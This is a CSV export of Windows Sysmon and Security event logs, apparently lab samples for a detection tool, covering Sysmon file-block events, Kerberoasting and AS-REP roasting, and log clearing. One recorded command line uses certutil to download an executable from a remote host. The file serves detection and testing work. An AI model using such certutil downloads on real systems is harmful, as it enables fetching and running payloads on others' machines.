RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
3,1908,2022-08-29 05:35:43.3684793,2,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2256,3192,DESKTOP-VQBONAV,0,S-1-5-18,A process changed a file creation time,NT AUTHORITY\SYSTEM,,"ProcessID: 696, ProcessGUID: 3e153517-4dd2-630c-1400-000000000500",RuleName: T1099,Image: C:\Windows\system32\svchost.exe,TargetFilename: C:\Windows\Personalization\LockScreenImage\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe,CreationTimeUTC: 2022-05-29 08:04:04.000,PreviousCreationTimeUTC: 2022-08-29 05:35:43.344,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingSvchost.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1099""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 05:35:43.359""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4dd2-630c-1400-000000000500""},{""@Name"":""ProcessId"",""#text"":""696""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Personalization\\LockScreenImage\\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-05-29 08:04:04.000""},{""@Name"":""PreviousCreationUtcTime"",""#text"":""2022-08-29 05:35:43.344""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
4,1909,2022-08-29 05:35:43.3686670,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2256,3192,DESKTOP-VQBONAV,0,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 696, ProcessGUID: 3e153517-4dd2-630c-1400-000000000500",RuleName: EXE,Image: C:\Windows\system32\svchost.exe,TargetFilename: C:\Windows\Personalization\LockScreenImage\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingSvchost.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 05:35:43.344""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4dd2-630c-1400-000000000500""},{""@Name"":""ProcessId"",""#text"":""696""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Personalization\\LockScreenImage\\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-08-29 05:35:43.344""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
5,1910,2022-08-29 05:35:43.3749745,27,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2256,3192,DESKTOP-VQBONAV,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingSvchost.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""ImageBlock""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 05:35:43.359""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4dd2-630c-1400-000000000500""},{""@Name"":""ProcessId"",""#text"":""696""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Personalization\\LockScreenImage\\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe""},{""@Name"":""Hashes"",""#text"":""MD5=E112A827FAB9F8378C76040187A6F336,SHA256=ED369187681A62247E38D930320F1CD771756D0B7B67072D8EC655EF99E14AEB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729""}]}}"
1,1339,2022-08-29 04:43:48.0156653,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,Process creation,DESKTOP-VQBONAV\user,,"ProcessID: 8636, ProcessGUID: 3e153517-4404-630c-0003-000000000400",RuleName: -,"MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43",ParentProcess: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"ParentProcessID: 8960, ParentProcessGUID: 3e153517-43c6-630c-f202-000000000400","ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","""C:\Windows\system32\certutil.exe"" -urlcache -split -f http://192.168.158.128:8000/calc.exe C:\Users\user\Desktop\calc.exe",False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.012""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\certutil.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.18362.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""CertUtil.exe""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""CertUtil.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\certutil.exe\"" -urlcache -split -f http://192.168.158.128:8000/calc.exe C:\\Users\\user\\Desktop\\calc.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\user\\""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""LogonGuid"",""#text"":""3e153517-1483-630c-3e62-010000000000""},{""@Name"":""LogonId"",""#text"":""0x1623E""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43""},{""@Name"":""ParentProcessGuid"",""#text"":""3e153517-43c6-630c-f202-000000000400""},{""@Name"":""ParentProcessId"",""#text"":""8960""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" ""},{""@Name"":""ParentUser"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
2,1340,2022-08-29 04:43:48.0166186,10,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,ProcessAccess,SourceUser: DESKTOP-VQBONAV\user | TargetUser: DESKTOP-VQBONAV\user,,,GrantedAccess: Unknown code (0x1FFFFF),"SourceProcessID: 8960, SourceProcessGUID: ",SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"TargetProcessID: 8636, TargetProcessGUID: ",TargetImage: C:\Windows\system32\certutil.exe,CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d8d4|C:\Windows\System32\KERNELBASE.dll+5e4c0|C:\Windows\System32\KERNELBASE.dll+5c056|C:\Windows\System32\KERNEL32.DLL+1be93|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\d8eed133ae660904dfe3ed4521157cbc\System.ni.dll+383236|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\d8eed133ae660904dfe3ed4521157cbc\System.ni.dll+2c3809|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\d8eed133ae660904dfe3ed4521157cbc\System.ni.dll+2c3179|UNKNOWN(00007FFCF689D134),False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.007""},{""@Name"":""SourceProcessGUID"",""#text"":""3e153517-43c6-630c-f202-000000000400""},{""@Name"":""SourceProcessId"",""#text"":""8960""},{""@Name"":""SourceThreadId"",""#text"":""5048""},{""@Name"":""SourceImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""TargetProcessGUID"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""TargetProcessId"",""#text"":""8636""},{""@Name"":""TargetImage"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""GrantedAccess"",""#text"":""0x1FFFFF""},{""@Name"":""CallTrace"",""#text"":""C:\\Windows\\SYSTEM32\\ntdll.dll+9d8d4|C:\\Windows\\System32\\KERNELBASE.dll+5e4c0|C:\\Windows\\System32\\KERNELBASE.dll+5c056|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\d8eed133ae660904dfe3ed4521157cbc\\System.ni.dll+383236|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\d8eed133ae660904dfe3ed4521157cbc\\System.ni.dll+2c3809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\d8eed133ae660904dfe3ed4521157cbc\\System.ni.dll+2c3179|UNKNOWN(00007FFCF689D134)""},{""@Name"":""SourceUser"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""TargetUser"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
3,1341,2022-08-29 04:43:48.1285072,27,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""ImageBlock""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.117""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\\02E7958E9A9619FDA0A027756E601291""},{""@Name"":""Hashes"",""#text"":""MD5=E112A827FAB9F8378C76040187A6F336,SHA256=ED369187681A62247E38D930320F1CD771756D0B7B67072D8EC655EF99E14AEB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729""}]}}"
4,1342,2022-08-29 04:43:48.1808981,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,FileCreate,DESKTOP-VQBONAV\user,,"ProcessID: 8636, ProcessGUID: 3e153517-4404-630c-0003-000000000400",RuleName: EXE,Image: C:\Windows\system32\certutil.exe,TargetFilename: C:\Users\user\AppData\Local\Microsoft\Windows\INetCache\IE\NZ19LUSG\calc[1].exe,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\NZ19LUSG\\calc[1].exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
5,1343,2022-08-29 04:43:48.1835647,27,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""ImageBlock""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\NZ19LUSG\\calc[1].exe""},{""@Name"":""Hashes"",""#text"":""MD5=E112A827FAB9F8378C76040187A6F336,SHA256=ED369187681A62247E38D930320F1CD771756D0B7B67072D8EC655EF99E14AEB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729""}]}}"
6,1344,2022-08-29 04:43:48.1857743,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,FileCreate,DESKTOP-VQBONAV\user,,"ProcessID: 8636, ProcessGUID: 3e153517-4404-630c-0003-000000000400",RuleName: EXE,Image: C:\Windows\system32\certutil.exe,TargetFilename: C:\Users\user\Desktop\calc.exe,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\Desktop\\calc.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
7,1345,2022-08-29 04:43:48.1870892,27,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2060,7132,DESKTOP-VQBONAV,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingCertutil.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""ImageBlock""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 04:43:48.179""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4404-630c-0003-000000000400""},{""@Name"":""ProcessId"",""#text"":""8636""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\certutil.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\user\\Desktop\\calc.exe""},{""@Name"":""Hashes"",""#text"":""MD5=E112A827FAB9F8378C76040187A6F336,SHA256=ED369187681A62247E38D930320F1CD771756D0B7B67072D8EC655EF99E14AEB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729""}]}}"
1,38677,2021-04-29 09:23:54.2442261,1102,Info,Microsoft-Windows-Eventlog,Security,324,884,DC-Server-1.labcorp.local,0,,Event log cleared,LABCORP\Administrator,,SID: (S-1-5-21-2662618741-3450174888-1698379039-500),,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-2662618741-3450174888-1698379039-500"",""SubjectUserName"":""Administrator"",""SubjectDomainName"":""LABCORP"",""SubjectLogonId"":""0x88324""}}}"
2,38678,2021-04-29 09:23:58.6908657,4776,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1632,DC-Server-1.labcorp.local,0,,NTLM authentication request,,,Target: Alice,"Workstation: ",Status: Status OK,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""PackageName"",""#text"":""MICROSOFT_AUTHENTICATION_PACKAGE_V1_0""},{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""Workstation""},{""@Name"":""Status"",""#text"":""0x0""}]}}"
3,38679,2021-04-29 09:23:58.6910900,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1632,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (192.168.1.200)",Target: LABCORP\Alice,LogonType 3,LogonId: 0x27D676,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1103""},{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0x27D676""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""NtLmSsp ""},{""@Name"":""AuthenticationPackageName"",""#text"":""NTLM""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""NTLM V2""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.1.200""},{""@Name"":""IpPort"",""#text"":""40316""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
4,38680,2021-04-29 09:23:58.7182392,4768,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1700,DC-Server-1.labcorp.local,0,,A Kerberos authentication ticket (TGT) was requested,,::ffff:192.168.1.200:55976,Target: LABCORP.LOCAL\Alice,ServiceName: krbtgt,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-502,TicketEncryptionType: RC4-HMAC,Status: KDC_ERR_NONE - No error - No errors were found.,PreAuthType: PA-ENC-TIMESTAMP - This type is normal for standard password authentication.,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1103""},{""@Name"":""ServiceName"",""#text"":""krbtgt""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-502""},{""@Name"":""TicketOptions"",""#text"":""0x50800000""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""TicketEncryptionType"",""#text"":""0x17""},{""@Name"":""PreAuthType"",""#text"":""2""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.200""},{""@Name"":""IpPort"",""#text"":""55976""},{""@Name"":""CertIssuerName""},{""@Name"":""CertSerialNumber""},{""@Name"":""CertThumbprint""}]}}"
5,38681,2021-04-29 09:23:58.7267239,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1632,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::ffff:192.168.1.200:55978,Target: LABCORP.LOCAL\Alice@LABCORP.LOCAL,ServiceName: sql101,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-2102,TicketEncryptionType: RC4-HMAC,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""Alice@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""sql101""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-2102""},{""@Name"":""TicketOptions"",""#text"":""0x40810010""},{""@Name"":""TicketEncryptionType"",""#text"":""0x17""},{""@Name"":""IpAddress"",""#text"":""::ffff:192.168.1.200""},{""@Name"":""IpPort"",""#text"":""55978""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""19aad67b-eada-e246-a523-b263eab9da60""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
6,38682,2021-04-29 09:23:58.7350760,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,656,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\Alice,LogonType 3,LogonId: 0x27D676,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.003_StealOrForgeKerberosTicketsKerberoasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1103""},{""@Name"":""TargetUserName"",""#text"":""Alice""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0x27D676""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
1,37860,2021-04-29 07:55:53.4237616,1102,Info,Microsoft-Windows-Eventlog,Security,324,480,DC-Server-1.labcorp.local,0,,Event log cleared,LABCORP\Administrator,,SID: (S-1-5-21-2662618741-3450174888-1698379039-500),,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-2662618741-3450174888-1698379039-500"",""SubjectUserName"":""Administrator"",""SubjectDomainName"":""LABCORP"",""SubjectLogonId"":""0x778E00""}}}"
2,37861,2021-04-29 07:56:22.8869945,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC660C0,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC660C0""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
3,37862,2021-04-29 07:56:22.8874152,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC660C0,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC660C0""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""54365""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
